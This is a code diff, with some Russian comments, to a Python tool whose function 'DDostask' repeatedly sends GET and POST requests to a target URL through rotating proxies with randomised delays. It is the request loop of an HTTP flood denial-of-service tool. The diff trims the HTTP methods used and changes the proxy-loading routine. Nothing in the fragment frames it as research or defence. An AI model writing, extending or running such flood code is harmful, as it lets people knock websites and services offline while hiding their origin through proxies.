@@ -80,9 +80,8 @@ PROXIES_LIST = []
 def load_proxies(file_path: str) -> dict:
     """Загружает прокси из конфигурационного файла"""
     global PROXIES_LIST
-    PROXIES_LIST = []
     
-    # Проверяем существование файла
+    # Proxy test
     if not os.path.exists(file_path):
         print(f"{Fore.RED}Proxy config file not found: {file_path}")
         return False
@@ -1881,7 +1880,7 @@ def DDostask(ddtarget, ddmin, ddmax, task_id, proxy_dict=None):
         }
         
         # Random HTTP method
-        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE']
+        methods = ['GET', 'POST']
         method = random.choice(methods)
         
         # Execute request
@@ -1890,14 +1889,6 @@ def DDostask(ddtarget, ddmin, ddmax, task_id, proxy_dict=None):
             response = requests.get(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
         elif method == 'POST':
             response = requests.post(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
-        elif method == 'HEAD':
-            response = requests.head(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
-        elif method == 'OPTIONS':
-            response = requests.options(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
-        elif method == 'PUT':
-            response = requests.put(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
-        elif method == 'DELETE':
-            response = requests.delete(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
         
         delay = random.uniform(ddmin, ddmax)
         time.sleep(delay)
